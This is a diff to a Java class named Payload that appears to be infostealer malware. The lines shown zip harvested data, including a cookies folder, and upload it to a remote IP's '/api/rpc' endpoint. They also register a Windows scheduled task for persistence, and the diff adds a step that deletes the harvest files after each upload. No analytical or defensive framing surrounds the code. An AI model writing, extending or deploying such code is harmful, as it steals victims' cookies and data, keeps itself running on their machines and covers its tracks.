@@ -5,6 +5,7 @@ import java.net.URL;
 import java.nio.file.*;
 import java.util.Base64;
 import java.util.zip.*;
+import java.util.Comparator;
 
 public class Payload {
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
@@ -239,8 +240,28 @@ public class Payload {
             uploadFile("http://" + ip + "/api/rpc", zipFile, key);
             log("Done!");
 
+            // NEW: Cleanup old files so the next run gets a fresh sample
+            log("Cleaning up harvest files...");
+            if (zipFile.exists()) zipFile.delete();
+            deleteDir(new File(loaderDir, "output"));
+            deleteDir(new File(loaderDir, "cookies"));
+            log("Cleanup complete.");
+
         } catch (Exception e) {
             log("Execute Error: " + e.toString());
+        }
+    }
+
+    // Helper to recursively delete a directory
+    private static void deleteDir(File dir) {
+        if (!dir.exists()) return;
+        try {
+            Files.walk(dir.toPath())
+                .sorted(Comparator.reverseOrder())
+                .map(Path::toFile)
+                .forEach(File::delete);
+        } catch (Exception e) {
+            log("Failed to delete " + dir.getName() + ": " + e.toString());
         }
     }
 
@@ -252,10 +273,8 @@ public class Payload {
             String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
             String javawPath = javaHome + "\\bin\\javaw.exe";
             
-            // Build the exact command string to run
             String trCmd = "\"" + javawPath + "\" -jar \"" + jarPath + "\" " + key + " " + ip;
 
-            // Use ProcessBuilder to call schtasks directly without XML
             ProcessBuilder pb = new ProcessBuilder(
                 "schtasks.exe",
                 "/Create",
